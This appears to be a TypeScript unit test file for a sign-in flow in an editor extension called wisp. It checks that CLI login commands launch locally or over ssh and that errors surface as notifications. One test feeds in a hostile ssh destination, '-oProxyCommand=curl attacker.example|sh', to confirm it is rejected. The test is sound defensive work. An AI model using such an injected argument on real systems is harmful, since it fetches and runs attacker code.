/*---------------------------------------------------------------------------------------------
 *  wisp: not part of Code - OSS. Edit editor/overlay in the wisp repo, not this copy.
 *--------------------------------------------------------------------------------------------*/

import assert from 'assert';
import { Emitter } from '../../../../../base/common/event.js';
import { ensureNoDisposablesAreLeakedInTestSuite } from '../../../../../base/test/common/utils.js';
import { INotificationService } from '../../../../../platform/notification/common/notification.js';
import type { DetectedCli } from '../../../../../platform/wisp/common/wispProtocol.js';
import type { ICreateTerminalOptions, ITerminalInstance, ITerminalService } from '../../../../../workbench/contrib/terminal/browser/terminal.js';
import { IWispAccountsService } from '../../browser/wispAccounts.js';
import { WispSignInFlow } from '../../browser/wispSignIn.js';

function cli(overrides: Partial<DetectedCli> = {}): DetectedCli {
	return { cli: 'claude', installed: true, ...overrides };
}

/** Records every `createAndFocusTerminal` call and hands back a fake instance whose exit the test fires itself. */
class FakeTerminalService {
	readonly created: ICreateTerminalOptions[] = [];
	private readonly exit = new Emitter<number | undefined>();
	private failNext = false;

	readonly onExit = this.exit.event;

	async createAndFocusTerminal(options?: ICreateTerminalOptions): Promise<ITerminalInstance> {
		if (this.failNext) {
			this.failNext = false;
			throw new Error('spawn failed');
		}
		this.created.push(options!);
		return { onExit: this.exit.event } as unknown as ITerminalInstance;
	}

	fireExit(code: number | undefined = 0): void {
		this.exit.fire(code);
	}

	failNextCreate(): void {
		this.failNext = true;
	}
}

class FakeAccountsService {
	refreshCalls = 0;
	async refreshClis(): Promise<void> {
		this.refreshCalls++;
	}
}

class FakeNotificationService {
	readonly errors: string[] = [];
	error(message: string): void {
		this.errors.push(message);
	}
}

suite('wisp: sign-in flow', () => {

	ensureNoDisposablesAreLeakedInTestSuite();

	function setup() {
		const terminal = new FakeTerminalService();
		const accounts = new FakeAccountsService();
		const notifications = new FakeNotificationService();
		const flow = new WispSignInFlow(terminal as unknown as ITerminalService, accounts as unknown as IWispAccountsService, notifications as unknown as INotificationService);
		const launched = () => {
			const config = terminal.created[0].config;
			assert.ok(config && 'executable' in config);
			return [config.executable, ...config.args ?? []];
		};
		return { terminal, accounts, notifications, flow, launched };
	}

	test('opens a terminal running the CLI\'s login command, locally or over ssh', async () => {
		const local = setup();
		await local.flow.run(cli({ cli: 'claude' }), 'local');
		assert.deepStrictEqual(local.launched(), ['claude', 'auth', 'login']);
		assert.strictEqual(local.notifications.errors.length, 0);

		const remote = setup();
		await remote.flow.run(cli({ cli: 'cursor' }), 'mac-mini');
		assert.deepStrictEqual(remote.launched(), ['ssh', '-t', '--', 'mac-mini', 'env', 'NO_OPEN_BROWSER=1', 'agent', 'login']);
		local.terminal.fireExit(0);
		remote.terminal.fireExit(0);
	});

	test('refreshes the detected CLIs once the terminal exits, whatever the exit code, and only once', async () => {
		for (const code of [0, undefined]) {
			const { terminal, accounts, flow } = setup();
			await flow.run(cli(), 'local');
			assert.strictEqual(accounts.refreshCalls, 0);
			terminal.fireExit(code);
			terminal.fireExit(code);
			assert.strictEqual(accounts.refreshCalls, 1);
		}
	});

	test('an invalid ssh destination, or a terminal that fails to open, shows a notification instead', async () => {
		const invalid = setup();
		await invalid.flow.run(cli(), '-oProxyCommand=curl attacker.example|sh');
		assert.strictEqual(invalid.terminal.created.length, 0);
		assert.strictEqual(invalid.notifications.errors.length, 1);

		const failing = setup();
		failing.terminal.failNextCreate();
		await failing.flow.run(cli(), 'local');
		assert.strictEqual(failing.notifications.errors.length, 1);
		assert.strictEqual(failing.accounts.refreshCalls, 0);
	});
});
